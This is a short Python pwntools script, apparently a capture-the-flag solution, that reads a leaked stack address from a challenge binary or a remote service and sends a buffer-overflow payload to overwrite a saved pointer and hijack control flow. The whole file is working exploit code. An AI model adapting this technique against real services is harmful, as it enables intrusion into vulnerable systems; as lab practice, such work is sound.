from pwn import *
from sys import argv

def __main__():
    if('local' in argv):
        p = process('./chal')
    else:
        p = remote('192.168.1.9', 22221)
    p.recvuntil('Here\'s a little gift: ')
    tmp = p.recvline()
    rbp = int(tmp[2:-1], 16)-248
    payload = b'A'*32
    payload += p64(rbp+0x38)
    payload += b'\x99AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\xf6\xf6'
    p.sendline(payload)
    print(p.recvall())

__main__()